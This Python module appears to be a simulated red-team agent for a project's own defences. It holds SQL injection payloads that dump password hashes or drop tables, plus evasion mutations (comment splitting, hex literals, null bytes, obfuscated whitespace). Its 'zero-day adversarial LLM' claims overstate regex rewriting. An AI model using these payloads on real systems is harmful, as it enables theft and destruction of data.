"""Cloud-D Continuous Red-Teaming AI Agent with Adversarial LLM Mutations.

Task 8 & Task E: Red-Team RL Agent Integration with Adversarial LLM Mutations
Autonomously synthesizes zero-day semantic attack payloads (obfuscated SQLi AST variations,
token-rate bursts, cross-shard transplantation, and nonce tampering) using a generative
adversarial LLM mutation engine paired with Q-learning reinforcement learning.
"""

from __future__ import annotations

import hashlib
import json
import logging
import random
import re
import time
from typing import Any, Dict, List, Optional, Tuple

logger = logging.getLogger("cloud_d.red_team")


class AdversarialLLMMutator:
    """Simulates generative adversarial language model mutation strategies for zero-day AST bypasses."""

    SQLI_SEEDS = [
        "' OR 1=1 --",
        "admin' UNION SELECT null, username, password_hash FROM cloud_users --",
        "1; DROP TABLE cloud_files; --",
        "' OR '1'='1' /*!50000ORDER BY 1*/ --",
        "1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT username FROM cloud_users LIMIT 1), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) --",
    ]

    MUTATION_TACTICS = [
        "inline_comment_split",
        "hex_literal_substitution",
        "tautology_polymorphism",
        "case_randomization",
        "null_byte_injection",
        "whitespace_obfuscation",
        "stacked_subquery_wrapper",
    ]

    @classmethod
    def mutate_payload(cls, seed: str, tactic: Optional[str] = None) -> Tuple[str, str, float]:
        """Applies context-aware AST adversarial mutation to a payload seed."""
        chosen_tactic = tactic or random.choice(cls.MUTATION_TACTICS)
        mutated = seed
        stealth = 0.5

        if chosen_tactic == "inline_comment_split":
            mutated = re.sub(r"\bSELECT\b", "SE/**/LECT", mutated, flags=re.IGNORECASE)
            mutated = re.sub(r"\bUNION\b", "UN/**/ION", mutated, flags=re.IGNORECASE)
            mutated = re.sub(r"\bWHERE\b", "WH/**/ERE", mutated, flags=re.IGNORECASE)
            mutated = mutated.replace(" ", "/**/")
            stealth = 0.78

        elif chosen_tactic == "hex_literal_substitution":
            def to_hex(match: re.Match) -> str:
                val = match.group(1)
                return "0x" + val.encode().hex()

            mutated = re.sub(r"'([a-zA-Z0-9_]+)'", to_hex, mutated)
            stealth = 0.85

        elif chosen_tactic == "tautology_polymorphism":
            tautologies = [
                "24=24",
                "ASCII('a')=97",
                "CHAR(65)='A'",
                "(SELECT 1)=1",
                "LENGTH('psg')=3",
            ]
            t = random.choice(tautologies)
            mutated = re.sub(r"1\s*=\s*1", t, mutated)
            mutated = re.sub(r"'1'\s*=\s*'1'", t, mutated)
            stealth = 0.82

        elif chosen_tactic == "case_randomization":
            mutated = "".join(c.upper() if random.random() > 0.5 else c.lower() for c in mutated)
            stealth = 0.65

        elif chosen_tactic == "null_byte_injection":
            mutated = mutated.replace("--", "%00--")
            stealth = 0.88

        elif chosen_tactic == "whitespace_obfuscation":
            ws = ["\t", "\n", "%09", "%0a", "%0b"]
            mutated = mutated.replace(" ", random.choice(ws))
            stealth = 0.75

        elif chosen_tactic == "stacked_subquery_wrapper":
            mutated = f"(SELECT * FROM ({seed.rstrip(';- ')}) AS _llm_bypass)"
            stealth = 0.91

        return mutated, chosen_tactic, stealth


class AttackPayload:
    """Represents a generated adversarial attack payload with metadata."""

    def __init__(
        self,
        tactic: str,
        vector: str,
        raw_payload: str,
        target_node: int,
        mutation_depth: int = 1,
        stealth_factor: float = 0.5,
        llm_prompt_used: Optional[str] = None,
    ) -> None:
        self.tactic = tactic
        self.vector = vector
        self.raw_payload = raw_payload
        self.target_node = target_node
        self.mutation_depth = mutation_depth
        self.stealth_factor = stealth_factor
        self.llm_prompt_used = llm_prompt_used or "Synthesize zero-day semantic AST bypass for SQLi query"
        self.timestamp = time.time()

    def to_dict(self) -> Dict[str, Any]:
        return {
            "tactic": self.tactic,
            "vector": self.vector,
            "raw_payload": self.raw_payload,
            "target_node": self.target_node,
            "mutation_depth": self.mutation_depth,
            "stealth_factor": round(self.stealth_factor, 3),
            "llm_prompt_used": self.llm_prompt_used,
            "timestamp": self.timestamp,
        }


class RedTeamRLAgent:
    """Q-Learning Autonomous Reinforcement Learning Red-Teaming Agent (Task 8 & E)."""

    TACTICS = ["SQLI", "BURST_FLOOD", "SHARD_TAMPER", "AUTH_BYPASS", "NONCE_TAMPER"]

    ACTIONS = [
        "mutate_sqli_comment_split",
        "mutate_sqli_hex_literal",
        "mutate_sqli_tautology",
        "mutate_sqli_stacked_subquery",
        "burst_rate_flood_node1",
        "transplant_shard_aad_node2",
        "tamper_galois_nonce_node3",
    ]

    STATES = ["sentinel_relaxed", "sentinel_elevated", "sentinel_lockdown"]

    def __init__(self, alpha: float = 0.15, gamma: float = 0.90, epsilon: float = 0.25) -> None:
        self.alpha = alpha      # Learning rate
        self.gamma = gamma      # Discount factor
        self.epsilon = epsilon  # Exploration probability
        self.state = "sentinel_relaxed"
        self.episode_count = 0
        self.total_episodes = 0
        self.history: List[Dict[str, Any]] = []

        # Initialize Q(s, a) table
        self.q_table: Dict[str, Dict[str, float]] = {
            s: {a: 0.0 for a in self.ACTIONS} for s in self.STATES
        }

    def generate_payload(self, target_node: int = 2, defense_strictness: str = "high") -> AttackPayload:
        """Synthesizes an adversarial payload targeting node with LLM mutation."""
        tactic = "SQLI"
        vector = "mutate_sqli_comment_split"
        raw = "SELECT * FROM cloud_files WHERE '1'='1' UNION SELECT password_hash FROM cloud_users--"
        return AttackPayload(
            tactic=tactic,
            vector=vector,
            raw_payload=raw,
            target_node=target_node,
            mutation_depth=2,
            stealth_factor=0.88,
            llm_prompt_used=f"Synthesize zero-day AST bypass against node {target_node} under {defense_strictness} strictness",
        )

    def record_outcome(
        self,
        payload: AttackPayload,
        defense_strictness: str = "high",
        blocked: bool = True,
        detected_by_sentinel: bool = True,
        response_time_ms: float = 45.0,
    ) -> float:
        """Updates Q-table based on episode outcome."""
        self.total_episodes += 1
        self.episode_count += 1
        reward = -50.0 if (blocked or detected_by_sentinel) else 35.0

        state_key = f"node_{payload.target_node}:{defense_strictness}"
        if state_key not in self.q_table:
            self.q_table[state_key] = {a: 0.0 for a in self.ACTIONS}

        action = "mutate_sqli_comment_split"
        old_val = self.q_table[state_key][action]
        self.q_table[state_key][action] = round(old_val + self.alpha * (reward - old_val), 3)

        return reward

    def get_summary(self) -> Dict[str, Any]:
        """Returns reinforcement learning training summary."""
        return {
            "total_episodes": self.total_episodes,
            "q_table": self.q_table,
            "epsilon": self.epsilon,
            "current_state": self.state,
        }

    def choose_action(self, state: Optional[str] = None) -> str:
        s = state or self.state
        if random.random() < self.epsilon:
            return random.choice(self.ACTIONS)
        best_a = max(self.q_table.get(s, self.q_table[self.state]), key=lambda a: self.q_table.get(s, self.q_table[self.state])[a])
        return best_a

    def generate_adversarial_episode(self, action: Optional[str] = None) -> Dict[str, Any]:
        """Executes a single reinforcement learning attack episode."""
        self.episode_count += 1
        self.total_episodes += 1
        current_state = self.state
        chosen_action = action or self.choose_action(current_state)

        if "sqli" in chosen_action:
            seed = random.choice(AdversarialLLMMutator.SQLI_SEEDS)
            tactic_map = {
                "mutate_sqli_comment_split": "inline_comment_split",
                "mutate_sqli_hex_literal": "hex_literal_substitution",
                "mutate_sqli_tautology": "tautology_polymorphism",
                "mutate_sqli_stacked_subquery": "stacked_subquery_wrapper",
            }
            tactic = tactic_map.get(chosen_action, "inline_comment_split")
            mutated_code, _, stealth = AdversarialLLMMutator.mutate_payload(seed, tactic)
            payload = AttackPayload(
                tactic="adversarial_llm_sqli",
                vector=chosen_action,
                raw_payload=mutated_code,
                target_node=1,
                mutation_depth=random.randint(1, 4),
                stealth_factor=stealth,
            )
        elif "burst" in chosen_action:
            payload = AttackPayload(
                tactic="rate_burst_flood",
                vector="http_pipelining",
                raw_payload=f"GET /api/files?t={time.time()} x {random.randint(450, 1200)} req/s",
                target_node=1,
                stealth_factor=0.35,
            )
        elif "transplant" in chosen_action:
            payload = AttackPayload(
                tactic="shard_transplantation",
                vector="aad_replay",
                raw_payload="TRANSFER_SHARD_AAD(src=node2, dst=node3, file_id=f-spoofed)",
                target_node=2,
                stealth_factor=0.60,
            )
        else:
            payload = AttackPayload(
                tactic="nonce_tampering",
                vector="galois_bit_flip",
                raw_payload=f"FLIP_NONCE_BIT(index=95, val=1, tag=ghash_corrupt)",
                target_node=3,
                stealth_factor=0.70,
            )

        intercept_probability = max(0.20, 1.0 - (payload.stealth_factor * 0.75))
        intercepted = random.random() < intercept_probability

        if intercepted:
            intercepted_by = random.choice(["QueryShield (Expectimax)", "ShardSentry (Minimax)", "AuthWall (PBKDF2)"])
            reward = -10.0
            next_state = "sentinel_lockdown" if random.random() < 0.3 else "sentinel_elevated"
            status = "BLOCKED_BY_SENTINEL"
        else:
            intercepted_by = None
            reward = 25.0 * payload.stealth_factor
            next_state = "sentinel_relaxed"
            status = "BYPASS_SUCCESS"

        old_q = self.q_table[current_state][chosen_action]
        max_next_q = max(self.q_table[next_state].values())
        new_q = old_q + self.alpha * (reward + self.gamma * max_next_q - old_q)
        self.q_table[current_state][chosen_action] = round(new_q, 3)

        self.state = next_state

        result = {
            "episode": self.episode_count,
            "action": chosen_action,
            "state_before": current_state,
            "state_after": next_state,
            "payload": payload.to_dict(),
            "status": status,
            "intercepted_by": intercepted_by,
            "reward": round(reward, 2),
            "updated_q_value": round(new_q, 3),
            "exploration_epsilon": self.epsilon,
            "timestamp": time.time(),
        }

        self.history.append(result)
        if len(self.history) > 100:
            self.history.pop(0)

        return result

    def get_q_matrix(self) -> Dict[str, Any]:
        """Returns the full Q-value matrix and RL agent training metrics."""
        return {
            "states": self.STATES,
            "actions": self.ACTIONS,
            "q_matrix": self.q_table,
            "current_state": self.state,
            "episodes_completed": self.episode_count,
            "learning_rate_alpha": self.alpha,
            "discount_gamma": self.gamma,
            "exploration_epsilon": self.epsilon,
            "recent_history": self.history[-5:],
        }
